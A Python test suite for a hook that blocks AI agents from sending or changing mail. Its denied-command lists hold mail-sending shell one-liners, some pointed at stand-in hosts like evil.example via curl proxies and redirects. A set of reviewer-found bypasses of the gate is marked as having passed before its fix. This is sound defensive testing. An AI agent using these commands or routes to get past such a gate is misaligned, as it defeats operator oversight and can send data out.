"""Tests for global/hooks/mail-send-gate (PreToolUse gate: agents never send or change mail).

The hook runs as a subprocess with synthetic JSON on stdin; HOME, MAIL_SEND_GATE_STATE and CLAUDE_TOOLKIT_CONFIG_DIR
point into a temp dir, so neither the real cache nor the real config is touched. No mail binary is ever executed:
the hook only reads the command text.
"""
import importlib.machinery
import importlib.util
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from scripts.toolkit.paths import REPO_ROOT

HOOK = str(REPO_ROOT / 'global/hooks/mail-send-gate')
SHIPPED = REPO_ROOT / 'global/config/mail-send-gate.json'
OPAQUE = 'mcp__0000aaaa-0000-0000-0000-000000000000__'

WRITE_TOOLS = (
    'send_message', 'send_email', 'reply', 'reply_all', 'forward', 'create_draft', 'update_draft', 'delete_draft',
    'send_draft', 'label_message', 'label_thread', 'unlabel_message', 'unlabel_thread', 'update_message_labels',
    'apply_sensitive_message_label', 'apply_sensitive_thread_label', 'create_label', 'update_label', 'delete_label',
    'trash_message', 'trash_thread', 'untrash_message', 'untrash_thread', 'mark_message_spam', 'mark_thread_spam',
    'unmark_message_spam', 'unmark_thread_spam',
)
READ_TOOLS = ('search_threads', 'get_message', 'get_thread', 'list_labels', 'list_drafts', 'get_draft',
              'download_gmail_attachment')
NON_MAIL = ('mcp__drivesrv__trash_file', 'mcp__drivesrv__create_file', 'mcp__drivesrv__share_file',
            'mcp__calsrv__delete_event', 'mcp__calsrv__create_event', 'mcp__ccd_session_mgmt__send_message')

HEREDOC_SEND = "python3 - <<'EOF'\nimport smtplib\nsmtplib.SMTP_SSL(\"smtp.example.com\").sendmail('a', 'b', 'c')\nEOF"
HEREDOC_FILE = "cat > f.py <<'EOF'\nimport smtplib\nsmtplib.SMTP('smtp.example.com')\nEOF"

BASH_DENIED = (
    'sendmail -t < msg.txt', '/usr/sbin/sendmail a@example.com', 'echo hi | mail -s subject a@example.com',
    'mailx -s s a@example.com < f', 'mutt -s subject a@example.com < f', 'mutt a@example.com < f',
    'sudo sendmail -t < m', 'sudo -u mailer sendmail -t < m', 'bash -c "sendmail -t < m"', 'ls && sendmail -t < m',
    'ls; sendmail -t < m', 'cat m | sendmail -t', 'env X=1 sendmail -t < m', 'X=1 sendmail -t < m',
    'echo a@example.com | xargs sendmail', 'echo $(sendmail -t < m)', 'echo `sendmail -t < m`',
    'timeout 5 sendmail -t < m', 'command sendmail -t < m', 'nohup sendmail -t < m &', 'exec sendmail -t < m',
    'for f in *; do sendmail -t < "$f"; done', 'if true; then sendmail -t < m; fi', '{ sendmail -t < m; }',
    '! sendmail -t < m',
    # SMTP clients, remote or missing target
    'msmtp a@example.com < f', 'msmtp --host smtp.example.com a@example.com < f',
    'swaks --to a@example.com --server smtp.example.com', 'swaks --to a@example.com',
    'curl --url smtps://smtp.example.com:465 --mail-rcpt a@example.com -T m.txt',
    'curl --mail-rcpt a@example.com -T m.txt smtp.example.com',
    'curl --url=smtp://smtp.example.com --mail-rcpt a@example.com -T m',
    # look-alike hosts
    'curl smtp://localhost@evil.example:25 --mail-rcpt a@example.com -T m',
    'swaks --to a@example.com --server localhost.evil.example',
    'msmtp --host=x.test.evil.example a@example.com < m',
    'python3 -c "import smtplib; smtplib.SMTP(\'localhost.evil.example\')"',
    # inline interpreters
    'python3 -c "import smtplib; smtplib.SMTP(\'smtp.example.com\').sendmail(1, 2, 3)"',
    HEREDOC_SEND,
    'echo "import smtplib; smtplib.SMTP(\'smtp.example.com\')" | python3',
    'perl -MNet::SMTP -e \'Net::SMTP->new("smtp.example.com")\'',
    'php -r \'mail("a@example.com", "s", "b");\'',
    'python3 -c "import smtplib"',
    'python3 -c "import smtplib; smtplib.SMTP(\'localhost\'); smtplib.SMTP(\'smtp.example.com\')"',
    'ruby -rnet/smtp -e \'Net::SMTP.start("smtp.example.com")\'',
    'node -e "require(\'nodemailer\').createTransport({host: \'smtp.example.com\'})"',
)
BASH_PASSES = (
    'ls', 'grep -rn sendmail src/', 'grep -r sendmail .', 'mailbox search --from a@example.com',
    'global/scripts/mailbox search --from a@example.com',
    'python3 -m unittest scripts.toolkit.tests.pieces.test_mail_send_gate', 'git commit -m "fix mail"',
    'git commit -m "stop calling sendmail; use the queue"',
    'echo \'{"command":"sendmail x"}\' | python3 hooks/mail-send-gate', 'which msmtp', 'command -v sendmail',
    'type mailx', 'man sendmail', 'mutt -f ~/Mail', 'mutt', "git commit -m 'document $(sendmail)'",
    'curl https://example.com/smtp', 'python3 -m pytest tests/test_mailer.py',
    'python3 -m unittest tests.test_smtplib_helper', HEREDOC_FILE,
    "printf 'import smtplib' > notes.txt && python3 -m pytest",
    "git commit -m \"$(cat <<'EOF'\nstop calling sendmail; use `mail` never\nEOF\n)\"",
    'apt-get install msmtp swaks', 'npm run mail:test', 'docker compose logs mailpit', 'grep SMTP_HOST .env',
    'curl -s http://localhost:8025/api/v1/messages', 'find . -name "*mail*"', 'pip install secure-smtplib',
    'python3 -c "print(1)" && echo smtplib', 'for f in mail/*; do echo "$f"; done',
    "python3 - <<EOF\nimport smtplib\nsmtplib.SMTP('localhost', 1025)\nEOF",
    # local test mailer
    'curl smtp://localhost:1025 --mail-rcpt a@example.test -T m',
    'curl smtp://[::1]:1025 --mail-rcpt a@example.test -T m',
    'curl smtp://a.localhost:1025 --mail-rcpt a@example.test -T m',
    'swaks --to a@example.test --server 127.0.0.1:1025', 'swaks --to a@example.test -s b.test',
    'msmtp --host=mailpit.localhost a@example.test < m',
    'python3 -c "import smtplib; smtplib.SMTP(\'mail.app.test\', 1025)"',
    'python3 -c "import smtplib; smtplib.SMTP(host=\'localhost\', port=1025)"',
)

# Found by the independent confirm review (P4): every one of these passed the gate before its fix.
CONFIRM_DENIED = (
    'sudo -iu root sendmail -t < m', 'sudo -nu root sendmail -t < m', 'doas sendmail -t < m',
    "echo 'sendmail -t < m' | bash", "bash <<< 'sendmail -t < m'", "bash <<'EOF'\nsendmail -t < m\nEOF",
    'sh -s <<EOF\nmail -s x a@example.com < m\nEOF', "eval 'sendmail -t < m'", "su -c 'sendmail -t < m' root",
    "find . -name '*.eml' -exec sendmail -t {} \\;",
    'curl --connect-to localhost:25:evil.example:25 smtp://localhost --mail-rcpt a@example.com -T m',
    'curl -x socks5h://evil.example:1080 smtp://localhost --mail-rcpt a@example.com -T m',
    'curl --resolve localhost:25:203.0.113.9 smtp://localhost --mail-rcpt a@example.com -T m',
    'python3 -c "import smtplib; smtplib.SMTP(\'localhost\'); smtplib.SMTP(h).sendmail(1, 2, 3)"',
    'python3 -c "import smtplib; smtplib.SMTP(\'localhost\' + \'.evil.example\')"',
    'python3 -c "import smtplib; smtplib.SMTP(\'localhost\' \'.evil.example\')"',
    'python3 -Ic "import smtplib; smtplib.SMTP(\'smtp.example.com\')"',
    'python3 -uc "import smtplib; smtplib.SMTP(\'smtp.example.com\')"',
    "python3 /dev/stdin <<'EOF'\nimport smtplib\nsmtplib.SMTP('smtp.example.com')\nEOF",
    'perl -le \'use Net::SMTP; Net::SMTP->new("smtp.example.com")\'',
    'ruby -we \'require "net/smtp"; Net::SMTP.start("smtp.example.com")\'',
    'git send-email --to a@example.com 0001.patch', 'neomutt -s x a@example.com < m',
    's-nail -s x a@example.com < m', 'msmtpq a@example.com < m', 'ssmtp a@example.com < m',
)
CONFIRM_PASSES = (
    'git send-email --smtp-server localhost --to a@example.test 0001.patch', 'git log --grep send-email',
    "find . -name '*mail*' -exec grep -l smtp {} \\;", "su -c 'ls /var/mail' root", 'bash scripts/mail-report.sh',
    'sudo -iu root ls /var/mail', 'eval "$(ssh-agent -s)"', 'neomutt -f ~/Mail', 'ls ~/mail', 'man mail',
    'python3 -c "import smtplib; s = smtplib.SMTP(); s.connect(\'localhost\', 1025)"',
    'python3 -c "import smtplib; smtplib.SMTP(port=1025, host=\'localhost\')"',
    'php -r \'$m = new PHPMailer\\PHPMailer\\PHPMailer(); $m->Host = "localhost";\'',
)


def load_hook(name='mail_send_gate_inproc'):
    loader = importlib.machinery.SourceFileLoader(name, HOOK)
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


class GateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix='mail-send-gate-test-')
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.state = os.path.join(self.tmp, 'state')
        self.config = os.path.join(self.tmp, 'config')
        os.makedirs(self.config)

    def set_config(self, **values):
        with open(os.path.join(self.config, 'mail-send-gate.json'), 'w') as fh:
            json.dump(values, fh)

    def env(self):
        return dict(os.environ, HOME=self.tmp, MAIL_SEND_GATE_STATE=self.state, CLAUDE_TOOLKIT_CONFIG_DIR=self.config)

    def run_hook(self, stdin):
        if not isinstance(stdin, str):
            stdin = json.dumps(stdin)
        return subprocess.run([sys.executable, HOOK], input=stdin, capture_output=True, text=True, env=self.env(),
                              timeout=30)

    def tool(self, name, **inp):
        return self.run_hook({'tool_name': name, 'session_id': 's1', 'cwd': self.tmp, 'tool_input': inp})

    def bash(self, command, cwd=None):
        return self.run_hook({'tool_name': 'Bash', 'session_id': 's1', 'cwd': cwd or self.tmp,
                              'tool_input': {'command': command}})

    def assert_allowed(self, result, label=''):
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, '', label)

    def assert_denied(self, result, *words):
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertTrue(result.stdout, 'expected a deny')
        data = json.loads(result.stdout)['hookSpecificOutput']
        self.assertEqual(data['hookEventName'], 'PreToolUse')
        self.assertEqual(data['permissionDecision'], 'deny')
        reason = data['permissionDecisionReason']
        for word in ('mail-send-gate:', 'chat', 'file', 'correo-solo-lectura.md', 'never blocked') + words:
            self.assertIn(word, reason)
        return reason

    def log(self, name):
        try:
            with open(os.path.join(self.state, name)) as fh:
                return fh.read()
        except OSError:
            return ''

    # ---- 1.x skeleton and shipped defaults

    def test_broken_stdin_and_non_object_pass_silently(self):
        for stdin in ('{not json', '[1, 2]', '"text"', '', '{}'):
            with self.subTest(stdin=stdin):
                self.assert_allowed(self.run_hook(stdin))

    def test_unrelated_tools_pass_silently(self):
        for name in ('Read', 'Edit', 'Write', 'Agent'):
            with self.subTest(tool=name):
                self.assert_allowed(self.tool(name, file_path='x'))
        self.assert_allowed(self.bash('ls'))
        self.assertFalse(os.path.exists(self.state), 'plain allows write no file')

    def test_shipped_json_equals_the_hook_defaults(self):
        with open(SHIPPED) as fh:
            self.assertEqual(json.load(fh), load_hook('mail_send_gate_defaults').DEFAULTS)

    def test_decisions_are_identical_with_the_shipped_file_and_with_none(self):
        calls = [('Bash', c) for c in BASH_DENIED + BASH_PASSES] + \
                [('mcp__mailsrv__' + t, None) for t in WRITE_TOOLS + READ_TOOLS] + [(t, None) for t in NON_MAIL]

        def outcomes():
            out = []
            for name, command in calls:
                result = self.bash(command) if command is not None else self.tool(name)
                out.append(bool(result.stdout))
            return out
        without = outcomes()
        shutil.copy(SHIPPED, os.path.join(self.config, 'mail-send-gate.json'))
        self.assertEqual(outcomes(), without)

    # ---- 2.x connector branch

    def test_connector_table_over_tool_name_suffixes(self):
        for name in WRITE_TOOLS:
            for server in ('mcp__mailsrv__', OPAQUE):
                with self.subTest(tool=server + name):
                    self.assert_denied(self.tool(server + name), name)
        for name in READ_TOOLS:
            with self.subTest(tool=name):
                self.assert_allowed(self.tool('mcp__mailsrv__' + name), name)
        for name in NON_MAIL + ('mcp__nosplit', 'mcp__mailsrv__'):
            with self.subTest(tool=name):
                self.assert_allowed(self.tool(name), name)
        self.assertIn('deny-connector', self.log('decisions.log'))

    def test_a_read_pattern_wins_over_send_tools(self):
        self.set_config(send_tools=['^get_message$', '^send_message$'])
        self.assert_allowed(self.tool('mcp__mailsrv__get_message'))
        self.assert_denied(self.tool('mcp__mailsrv__send_message'))

    def test_drafts_off_by_default_says_so(self):
        reason = self.assert_denied(self.tool('mcp__mailsrv__create_draft'))
        self.assertIn('Drafts are off', reason)
        self.assertNotIn('Drafts are off', self.assert_denied(self.tool('mcp__mailsrv__send_message')))

    def test_drafts_on_opens_only_create_and_update(self):
        self.set_config(drafts=True)
        self.assert_allowed(self.tool('mcp__mailsrv__create_draft'))
        self.assert_allowed(self.tool('mcp__mailsrv__update_draft'))
        for name in ('send_draft', 'delete_draft', 'send_message'):
            with self.subTest(tool=name):
                self.assert_denied(self.tool('mcp__mailsrv__' + name))

    def test_bad_pattern_is_skipped_and_logged(self):
        self.set_config(send_tools=['(', '^send_message$'])
        self.assert_denied(self.tool('mcp__mailsrv__send_message'))
        self.assertIn("'('", self.log('errors.log'))

    def test_wrong_shapes_keep_the_defaults(self):
        self.set_config(drafts='yes', send_tools='send_message', ignore_servers=[''])
        self.assert_denied(self.tool('mcp__mailsrv__create_draft'), 'Drafts are off')
        self.assert_denied(self.tool('mcp__mailsrv__send_message'))
        self.assert_allowed(self.tool('mcp__ccd_session_mgmt__send_message'))

    def test_corrupt_config_never_allows_more(self):
        with open(os.path.join(self.config, 'mail-send-gate.json'), 'w') as fh:
            fh.write('{not json')
        self.assert_denied(self.tool('mcp__mailsrv__send_message'))
        self.assert_denied(self.bash('sendmail -t < m'))
        self.assert_allowed(self.tool('mcp__mailsrv__get_message'))

    # ---- 3.x Bash branch

    def test_bash_sends_are_denied(self):
        for command in BASH_DENIED:
            with self.subTest(command=command):
                self.assert_denied(self.bash(command))

    def test_bash_look_alikes_and_local_mailer_pass(self):
        for command in BASH_PASSES:
            with self.subTest(command=command):
                self.assert_allowed(self.bash(command), command)

    def test_local_host_match_is_anchored(self):
        hook = load_hook('mail_send_gate_hosts')
        for host in ('localhost', 'LOCALHOST', '127.0.0.1', '::1', '[::1]', '[::1]:1025', 'localhost:1025',
                     'a.localhost', 'b.test', 'mail.app.test.', 'localhost.', '127.0.0.1:25'):
            with self.subTest(host=host):
                self.assertTrue(hook.is_local(host))
        for host in ('', 'localhost.evil.example', 'x.test.evil.example', 'evil.example', 'mylocalhost',
                     'test', '127.0.0.2', 'notatest', 'localhost@evil.example'):
            with self.subTest(host=host):
                self.assertFalse(hook.is_local(host))

    def test_exempt_folder_allows_bash_only(self):
        proj = os.path.join(self.tmp, 'proj')
        os.makedirs(os.path.join(proj, 'sub'))
        os.makedirs(os.path.join(self.tmp, 'other'))
        self.set_config(exempt_paths=[proj])
        self.assert_allowed(self.bash('sendmail -t < m', cwd=os.path.join(proj, 'sub')))
        self.assert_denied(self.bash('sendmail -t < m', cwd=os.path.join(self.tmp, 'other')))
        self.assertIn('allow-exempt', self.log('decisions.log'))
        result = self.run_hook({'tool_name': 'mcp__mailsrv__send_message', 'session_id': 's1', 'cwd': proj,
                                'tool_input': {}})
        self.assert_denied(result)

    def test_extra_commands_are_denied_outside_exempt_folders(self):
        proj = os.path.join(self.tmp, 'proj')
        os.makedirs(proj)
        self.set_config(extra_commands=['bin/send-newsletter'], exempt_paths=[proj])
        self.assert_denied(self.bash('./bin/send-newsletter --all'), 'config')
        self.assert_allowed(self.bash('./bin/send-newsletter --all', cwd=proj))
        self.assert_allowed(self.bash('./bin/other --all'))

    # ---- 3.5 confirm-review bypasses (P4): each case passed before the fix

    def test_confirm_review_bypasses_are_denied(self):
        for command in CONFIRM_DENIED:
            with self.subTest(command=command):
                self.assert_denied(self.bash(command))

    def test_confirm_review_look_alikes_pass(self):
        for command in CONFIRM_PASSES:
            with self.subTest(command=command):
                self.assert_allowed(self.bash(command), command)

    def test_other_shell_tools_are_checked_like_bash(self):
        for tool in ('Monitor', 'mcp__termsrv__run_in_terminal'):
            with self.subTest(tool=tool):
                self.assert_denied(self.tool(tool, command='sendmail -t < m'))
                self.assert_allowed(self.tool(tool, command='tail -f mail.log'))

    # ---- 4.x reason and logs

    def test_decisions_log_never_holds_content(self):
        self.assert_denied(self.bash('echo secret-body | mail -s s a@example.com'))
        lines = self.log('decisions.log').splitlines()
        self.assertEqual(len(lines), 1)
        self.assertNotIn('secret-body', lines[0])
        self.assertNotIn('a@example.com', lines[0])
        self.assertIn('deny-bash-mail', lines[0])

    def test_an_internal_exception_fails_open(self):
        hook = load_hook('mail_send_gate_raises')
        hook.STATE_DIR = self.state
        payload = json.dumps({'tool_name': 'mcp__mailsrv__send_message', 'session_id': 's1', 'tool_input': {}})
        out = io.StringIO()
        with mock.patch.object(hook, 'decide', side_effect=RuntimeError('boom')), \
                mock.patch.object(sys, 'stdin', io.StringIO(payload)), mock.patch.object(sys, 'stdout', out):
            code = hook.main()
        self.assertEqual(code, 0)
        self.assertEqual(out.getvalue(), '')
        self.assertIn('RuntimeError: boom', self.log('errors.log'))


if __name__ == '__main__':
    unittest.main()
